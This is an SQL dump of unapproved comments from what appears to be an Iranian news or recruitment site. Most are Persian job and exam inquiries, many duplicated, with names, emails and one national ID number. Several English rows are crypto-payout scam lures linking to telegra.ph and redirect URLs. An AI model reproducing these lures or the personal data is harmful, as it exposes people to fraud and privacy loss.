INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87774, 59227, '⭕ Withdrawing 68 680 $.  Withdrаw => https://telegra.ph/BTC-Transaction--554796-03-14?hs=b9fdbba1f1f', 'hatty2001@murahpanel.com', '9egs63', 0, '2024-04-14 06:34:17', '1403/1/26', '6:34:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87775, 59230, '🟢 You got 65 505 Dollars.  GЕТ >>> https://telegra.ph/BTC-Transaction--870985-03-14?hs=8858037a68bd', 'hatty2001@murahpanel.com', 'xd6j7j', 0, '2024-04-14 06:34:53', '1403/1/26', '6:34:53 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87776, 60230, '✒ Operation №OX07  RECEIVE => https://script.google.com/macros/s/AKfycbye0Sed-Tle-MzdFQJLvloB2da-Scs', 'mbfraser@timhoreads.com', 'cdd7q6', 0, '2024-05-10 06:04:01', '1403/2/21', '6:04:01 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87777, 50185, 'Benyamin mohammadi', 'Benyaminmohammadix@gmail.com', 'سلام دوره کاردانی تست نفوذ برگزار میشه؟و اینکه برای دانشجویان غیر بومی از شهرستان های دیگه امکانات خوابگاه و... داره ؟؟', 0, '2024-05-16 22:20:17', '1403/2/27', '10:20:17 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87778, 50185, 'Benyamin mohammadi', 'Benyaminmohammadix@gmail.com', 'سلام دوره کاردانی تست نفوذ برگزار میشه؟و اینکه برای دانشجویان غیر بومی از شهرستان های دیگه امکانات خوابگاه و... داره ؟؟', 0, '2024-05-16 22:20:27', '1403/2/27', '10:20:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87779, 60232, 'امیر', 'amirminabhormoz@gmail.com', 'سلام چطور میتونم ثبت نام کنم یک ایده در مورد تولید آب با انرژی هسته دارم ', 0, '2024-05-25 07:41:56', '1403/3/5', '7:41:56 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87780, 60233, '🔓 Рrосеss 1,00359 ВТС. Rесеivе >> https://telegra.ph/BTC-Transaction--872054-05-10?hs=4c72901feb3c1', 'watcher2112@ecocryptolab.com', '2d38br', 0, '2024-06-10 22:39:06', '1403/3/21', '10:39:06 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87781, 60235, '⚙ Тrаnsfеr #GН21. NЕХТ > https://telegra.ph/BTC-Transaction--339492-05-10?hs=a60e3192259df0e68fcaf0c', 'watcher2112@ecocryptolab.com', '3q5vrm', 0, '2024-06-10 22:39:55', '1403/3/21', '10:39:55 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87782, 60232, '📇 Reminder: Operation 1.003487542 BTC. Receive >> https://out.carrotquest.io/r?hash=YXBwPTYyNTczJm', 'kpauls26@googl.win', 'hgkanc', 0, '2024-06-14 03:45:58', '1403/3/25', '3:45:58 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87783, 60233, '📚 Message; Process #IG05. LOG IN >>> https://out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZlcnNhdGlv', 'kpauls26@googl.win', '5lom8y', 0, '2024-06-14 03:46:09', '1403/3/25', '3:46:09 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87784, 60234, '📲 You got a transaction from us. Gо tо withdrаwаl =>> out.carrotquest.io/r?hash=YXBwPTYyNTczJmNvbnZ', 'kpauls26@googl.win', 'zb0xeo', 0, '2024-06-14 03:46:17', '1403/3/25', '3:46:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87785, 60235, '📘 We send a transfer from us. Gо tо withdrаwаl >> https://out.carrotquest.io/r?hash=YXBwPTYyNTczJm', 'kpauls26@googl.win', 'hjojoz', 0, '2024-06-14 03:46:24', '1403/3/25', '3:46:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87786, 60236, 'ماضی سلامت', 'mazisalamat@gmail.com', 'راننده پایه یک هستم مسلط به انواع ماشین سبک و سنگین .بخصوص جرثقیل', 0, '2024-06-24 22:59:22', '1403/4/4', '10:59:22 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87787, 60236, 'ماضی سلامت', 'mazisalamat@gmail.com', 'راننده پایه یک هستم مسلط به انواع ماشین سبک و سنگین .بخصوص جرثقیل', 0, '2024-06-24 22:59:47', '1403/4/4', '10:59:47 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87788, 60236, 'ماضی سلامت', 'mazisalamat@gmail.com', 'راننده پایه یک هستم مسلط به انواع ماشین آلات سبک و سنگین.الل خصوص جرثقیل ', 0, '2024-06-24 23:03:10', '1403/4/4', '11:03:10 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87789, 60236, 'طارق ساعدی', 'Saaeditareq@gmail.com', 'Saaeditareq@gmail.con', 0, '2024-06-25 02:24:32', '1403/4/5', '2:24:32 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87790, 60236, 'طارق ساعدی', 'Saaeditareq@gmail.com', 'Saaeditareq@gmail.con
کد ملی۱۷۴۱۲۱۹۲۵۶', 0, '2024-06-25 02:25:04', '1403/4/5', '2:25:04 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87791, 60236, 'طارق ساعدی', 'Saaeditareq@gmail.com', 'Saaeditareq@gmail.con
کد ملی۱۷۴۱۲۱۹۲۵۶', 0, '2024-06-25 02:25:42', '1403/4/5', '2:25:42 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87792, 51185, 'morteza salhi', 'mortezasavari810@gmail.com', 'شرکت در ازمون', 0, '2024-06-25 12:06:49', '1403/4/5', '12:06:49 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87793, 51185, 'morteza salhi', 'mortezasavari810@gmail.com', 'شرکت در ازمون', 0, '2024-06-25 12:06:51', '1403/4/5', '12:06:51 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87794, 51185, 'morteza salhi', 'mortezasavari810@gmail.com', 'شرکت در ازمون', 0, '2024-06-25 12:06:52', '1403/4/5', '12:06:52 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87795, 51185, 'عبدالکریم سیاحی', 'Karimsagahi1371@gmai.com', 'Gvc', 0, '2024-06-26 11:35:34', '1403/4/6', '11:35:34 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87796, 60236, 'محموددغاغله', 'www.mahmoddaghaghleh1371@gmail.com', 'استخادمی', 0, '2024-06-26 16:08:26', '1403/4/6', '4:08:26 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87797, 60236, 'محموددغاغله', 'www.mahmoddaghaghleh1371@gmail.com', 'استخادمی', 0, '2024-06-26 16:08:27', '1403/4/6', '4:08:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87798, 60236, 'محسن سواری', 'mhsnswary839@gmail.com', 'استخدام', 0, '2024-06-26 20:01:29', '1403/4/6', '8:01:29 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87799, 60236, 'محسن سواری', 'mhsnswary839@gmail.com', 'استخدام', 0, '2024-06-26 20:01:40', '1403/4/6', '8:01:40 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87800, 60236, 'محسن سواری', 'mhsnswary839@gmail.com', 'سلام', 0, '2024-06-26 20:01:47', '1403/4/6', '8:01:47 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87801, 60236, 'محسن سواری', 'mhsnswary839@gmail.com', 'سلام', 0, '2024-06-26 20:01:49', '1403/4/6', '8:01:49 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87802, 60236, 'محسن سواری', 'mhsnswary839@gmail.com', 'سلام', 0, '2024-06-26 20:01:50', '1403/4/6', '8:01:50 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87803, 60236, 'محسن سواری', 'mhsnswary839@gmail.com', 'استخدام نگهبان ', 0, '2024-06-26 20:01:51', '1403/4/6', '8:01:51 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87804, 60236, 'محسن سواری', 'mhsnswary839@gmail.com', 'سلام', 0, '2024-06-26 20:01:51', '1403/4/6', '8:01:51 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87805, 60236, 'محسن سواری', 'mhsnswary839@gmail.com', 'استخدام نگهبان ', 0, '2024-06-26 20:01:52', '1403/4/6', '8:01:52 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87806, 60236, 'محسن سواری', 'mhsnswary839@gmail.com', 'استخدام', 0, '2024-06-26 20:01:52', '1403/4/6', '8:01:52 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87807, 60236, 'سعید حیدری', 'heydarisaeed561@gmail.com', 'نگهبان', 0, '2024-06-26 23:24:18', '1403/4/6', '11:24:18 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87808, 60236, 'سعید حیدری', 'heydarisaeed561@gmail.com', 'نگهبان', 0, '2024-06-26 23:24:20', '1403/4/6', '11:24:20 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87809, 60237, 'محمد حاتم‌پور', 'Mohammadhatampor7@gmail.com', 'کسب درآمد', 0, '2024-06-29 10:13:26', '1403/4/9', '10:13:26 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87810, 60237, 'محمد حاتم‌پور', 'Mohammadhatampor7@gmail.com', 'کسب درآمد', 0, '2024-06-29 10:13:31', '1403/4/9', '10:13:31 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87811, 60237, 'محمد حاتم‌پور', 'Mohammadhatampor7@gmail.com', 'کسب درآمد', 0, '2024-06-29 10:13:36', '1403/4/9', '10:13:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87812, 60237, 'محمد حاتم‌پور', 'Mohammadhatampor7@gmail.com', 'کسب درآمد', 0, '2024-06-29 10:13:38', '1403/4/9', '10:13:38 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87813, 60237, 'محمد حاتم‌پور', 'Mohammadhatampor7@gmail.com', 'کسب درآمد', 0, '2024-06-29 10:13:41', '1403/4/9', '10:13:41 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87814, 60237, 'محمد حاتم‌پور', 'Mohammadhatampor7@gmail.com', 'کسب درامد ', 0, '2024-06-29 10:14:55', '1403/4/9', '10:14:55 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87815, 60237, 'محمد حاتم‌پور', 'Mohammadhatampor7@gmail.com', 'کسب درامد و ایجاد یک زندگی ارام', 0, '2024-06-29 10:14:59', '1403/4/9', '10:14:59 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87816, 60237, 'محمد حاتم‌پور', 'Mohammadhatampor7@gmail.com', 'کسب درامد و ایجاد یک زندگی ارام', 0, '2024-06-29 10:15:01', '1403/4/9', '10:15:01 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87817, 60237, 'محمد حاتم‌پور', 'Mohammadhatampor7@gmail.com', 'کسب درامد و ایجاد یک زندگی ارام', 0, '2024-06-29 10:15:02', '1403/4/9', '10:15:02 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87818, 60237, 'محمد حاتم‌پور', 'Mohammadhatampor7@gmail.com', 'کسب درامد و ایجاد یک زندگی ارام', 0, '2024-06-29 10:15:04', '1403/4/9', '10:15:04 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87819, 60237, 'محمد حاتم‌پور', 'Mohammadhatampor7@gmail.com', 'کسب درامد و ایجاد یک زندگی آرام', 0, '2024-06-29 10:15:24', '1403/4/9', '10:15:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87820, 60237, 'رضا جوادی نژاد', 'reza.javsdi.7111@gmail.com', 'سلام وقت بخیر.لطفا لینک دریافت دفترچه آزمون رو بذارین.تشکر', 0, '2024-06-29 15:42:59', '1403/4/9', '3:42:59 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87821, 60237, 'عظیم ذریعی', 'dodgefarhad@gmail.com', 'با عرض سلام جهت استخدام', 0, '2024-06-29 18:14:16', '1403/4/9', '6:14:16 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87822, 60237, 'مالک', 'alfa8085pro@gmail.com', 'دفترچه آزمون کجاست!', 0, '2024-06-29 18:50:55', '1403/4/9', '6:50:55 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87823, 51185, 'یونس بازدار', 'yonesbazdar@ogmil.com', 'سلام اگه شرایط ما با نگهبانی میخوره لطفا ', 0, '2024-06-29 19:22:46', '1403/4/9', '7:22:46 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87824, 51185, 'ناصرروشن', 'naserroshan42@gmail.com', 'حراست نگهبانی', 0, '2024-06-30 11:38:27', '1403/4/10', '11:38:27 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87825, 51185, 'ناصرروشن', 'naserroshan42@gmail.com', 'حراست نگهبانی', 0, '2024-06-30 11:38:40', '1403/4/10', '11:38:40 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87826, 51185, 'ناصرروشن', 'naserroshan42@gmail.com', 'حراست نگهبانی', 0, '2024-06-30 11:38:56', '1403/4/10', '11:38:56 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87827, 51185, 'ناصرروشن', 'naserroshan42@gmail.com', 'حراست نگهبانی', 0, '2024-06-30 11:39:10', '1403/4/10', '11:39:10 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87828, 51185, 'ناصرروشن', 'naserroshan42@gmail.com', 'حراست نگهبانی', 0, '2024-06-30 11:39:25', '1403/4/10', '11:39:25 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87829, 51185, 'ناصرروشن', 'naserroshan42@gmail.com', 'حراست نگهبانی', 0, '2024-06-30 11:39:36', '1403/4/10', '11:39:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87830, 60237, 'محمد امین مرادحسینی', 'www.amin1378@gmail.com', 'سلام و درود ،بنده جویای کار هستم ۲۴ سالمه دارای پایان خدمت ،دیپلم کامپیوتر ،فرزند ایثارگر هستم 
', 0, '2024-06-30 20:29:33', '1403/4/10', '8:29:33 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87831, 60237, 'محمد امین مرادحسینی', 'www.amin1378@gmail.com', 'سلام و درود ،بنده جویای کار هستم ۲۴ سالمه دارای پایان خدمت ،دیپلم کامپیوتر ،فرزند ایثارگر هستم 
', 0, '2024-06-30 20:29:34', '1403/4/10', '8:29:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87832, 60237, 'محمد امین مرادحسینی', 'www.amin1378@gmail.com', 'سلام و درود ،بنده جویای کار هستم ۲۴ سالمه دارای پایان خدمت ،دیپلم کامپیوتر ،فرزند ایثارگر هستم 
', 0, '2024-06-30 20:29:36', '1403/4/10', '8:29:36 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87833, 60237, 'محمد امین مرادحسینی', 'www.amin1378@gmail.com', 'سلام و درود ،بنده جویای کار هستم ۲۴ سالمه دارای پایان خدمت ،دیپلم کامپیوتر ،فرزند ایثارگر هستم 
', 0, '2024-06-30 20:29:37', '1403/4/10', '8:29:37 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87834, 60237, 'رضاخصافی زاده', 'rezakhasafii@gmail.com', 'جهت‌کار‌در حراست‌و نگهبانی', 0, '2024-07-02 05:27:58', '1403/4/12', '5:27:58 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87835, 60237, 'ناصرروشن', 'naserroshan42@gmail.com', 'نگهبان', 0, '2024-07-02 13:56:33', '1403/4/12', '1:56:33 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87836, 60237, 'ناصرروشن', 'naserroshan42@gmail.com', 'نگهبان', 0, '2024-07-02 13:57:00', '1403/4/12', '1:57:00 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87837, 60237, 'علی هاشم زاده', 'hashmzadhly433@gmail.com', 'سلام پس منابع کنابها کجان؟', 0, '2024-07-02 13:59:02', '1403/4/12', '1:59:02 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87838, 60237, 'علی هاشم زاده', 'hashmzadhly433@gmail.com', 'سلام پس منابع کنابها کجان؟', 0, '2024-07-02 13:59:03', '1403/4/12', '1:59:03 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87839, 60237, 'علی هاشم زاده', 'hashmzadhly433@gmail.com', 'سلام پس منابع کنابها کجان؟', 0, '2024-07-02 13:59:05', '1403/4/12', '1:59:05 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87840, 51185, 'احمد‌مشهدی', 'Ahmadmashhadi1234@gmail.com', '.......', 0, '2024-07-02 14:02:20', '1403/4/12', '2:02:20 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87841, 51185, 'احمد‌مشهدی', 'Ahmadmashhadi1234@gmail.com', '.......', 0, '2024-07-02 14:02:21', '1403/4/12', '2:02:21 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87842, 51185, 'احمد‌مشهدی', 'Ahmadmashhadi1234@gmail.com', '.......', 0, '2024-07-02 14:02:24', '1403/4/12', '2:02:24 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87843, 51185, 'احمد‌مشهدی', 'Ahmadmashhadi1234@gmail.com', '.......', 0, '2024-07-02 14:02:27', '1403/4/12', '2:02:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87844, 60237, 'مهدی شهابی', 'mehdishahabi1540@gmail.com', 'کار', 0, '2024-07-04 00:43:28', '1403/4/14', '12:43:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87845, 60237, 'مهدی شهابی', 'mehdishahabi1540@gmail.com', 'کار', 0, '2024-07-04 00:43:30', '1403/4/14', '12:43:30 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87846, 60237, 'مهدی شهابی', 'mehdishahabi1540@gmail.com', 'کار', 0, '2024-07-04 00:57:55', '1403/4/14', '12:57:55 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87847, 60237, 'مهدی سیاحی', 'meilad.2015.mm@gmail.com', 'سلام منبع اموزشی درس اشنایی با اصول حراست رو کجا پیدا کنم میشه راهنمایی کنید ', 0, '2024-07-06 00:56:56', '1403/4/16', '12:56:56 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87848, 60237, 'مهدی سیاحی', 'meilad.2015.mm@gmail.com', 'سلام منبع اموزشی درس اشنایی با اصول حراست رو کجا پیدا کنم میشه راهنمایی کنید ', 0, '2024-07-06 00:56:59', '1403/4/16', '12:56:59 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87849, 51185, 'هاشم محمودیان', 'gol.1400.gol@gmail.com', 'لا سلام دوره فن ورزی و ایمنی از دانشکده گلستان دریافت کردم و برای ثبت نام در ازمون روی لینک ثبت نام در آزمون استخدام نیروی حجمی باز نمیشه خطا میزنه لینک ثبت نام لطفا رفع اشکال بکنید که مهلت تموم نشه تا تاریخ 1403/04/27 ذکر شده و اجازه ثبت نام نمبده', 0, '2024-07-09 03:39:52', '1403/4/19', '3:39:52 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87850, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:21', '1403/4/19', '2:32:21 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87851, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:22', '1403/4/19', '2:32:22 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87852, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:23', '1403/4/19', '2:32:23 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87853, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:23', '1403/4/19', '2:32:23 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87854, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:25', '1403/4/19', '2:32:25 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87855, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:27', '1403/4/19', '2:32:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87856, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:27', '1403/4/19', '2:32:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87857, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:28', '1403/4/19', '2:32:28 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87858, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:28', '1403/4/19', '2:32:28 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87859, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:29', '1403/4/19', '2:32:29 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87860, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:32', '1403/4/19', '2:32:32 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87861, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:33', '1403/4/19', '2:32:33 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87862, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:34', '1403/4/19', '2:32:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87863, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '*', 0, '2024-07-09 14:32:34', '1403/4/19', '2:32:34 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87864, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '**', 0, '2024-07-09 14:32:42', '1403/4/19', '2:32:42 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87865, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '**', 0, '2024-07-09 14:32:46', '1403/4/19', '2:32:46 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87866, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '**', 0, '2024-07-09 14:32:46', '1403/4/19', '2:32:46 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87867, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '**', 0, '2024-07-09 14:32:47', '1403/4/19', '2:32:47 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87868, 51185, 'محمدهادی مذنبی', 'mohammadhadi.moznbi@gmaiL.com', '**', 0, '2024-07-09 14:32:48', '1403/4/19', '2:32:48 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87869, 51185, 'مسلم فردمنش', 'moslemfardmanash5766@gmail.com', 'استخدامی رشته برق', 0, '2024-07-10 16:37:02', '1403/4/20', '4:37:02 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87870, 51185, 'مسلم فردمنش', 'moslemfardmanash5766@gmail.com', 'استخدامی رشته برق', 0, '2024-07-10 16:37:03', '1403/4/20', '4:37:03 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87871, 51185, 'مسلم فردمنش', 'moslemfardmanash5766@gmail.com', 'استخدامی رشته برق', 0, '2024-07-10 16:37:06', '1403/4/20', '4:37:06 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (87872, 51185, 'محمد زهیری اصل', 'mehdi64kingnaseri@gmail.com', 'استخدام', 0, '2024-07-11 06:09:06', '1403/4/21', '6:09:06 AM');
